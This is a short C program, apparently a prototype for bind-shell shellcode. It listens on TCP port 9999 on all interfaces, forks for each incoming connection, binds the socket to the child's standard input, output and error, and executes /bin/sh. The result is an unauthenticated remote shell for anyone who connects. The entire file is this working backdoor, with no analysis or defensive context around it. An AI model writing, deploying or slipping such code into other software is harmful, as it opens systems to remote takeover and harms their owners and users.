#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(){
  char *execargs[] = {"/bin//sh", 0};
  int port = 9999;
  struct sockaddr_in server_sa;
  int sockaddr_size = sizeof(struct sockaddr_in);
  
  // clear it out
  memset(&server_sa, 0, sizeof(struct sockaddr_in));
 
  // setup the socket information
  server_sa.sin_family=AF_INET;
  server_sa.sin_port = htons(port);
  server_sa.sin_addr.s_addr = 0x00000000; //INADDR_ANY

  // create the socket
  int serversock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  // bind the socket to the address and port
  bind(serversock, (struct sockaddr *)&server_sa, sockaddr_size);

  // listed for incoming connections
  listen(serversock, 0);

  while(1){
    // accept a new connection
    struct sockaddr_in client_sa;
    int clientsock = accept(serversock, (struct sockaddr *) &client_sa, &sockaddr_size);

    int child = fork();
    if (!child){
	// this is the child
        dup2(clientsock,0);
  	dup2(clientsock,1);
	dup2(clientsock,2);
	execve(execargs[0],execargs,0);
    }
    else {
	int status;
	waitpid(child,&status,0);
    }
  }
}




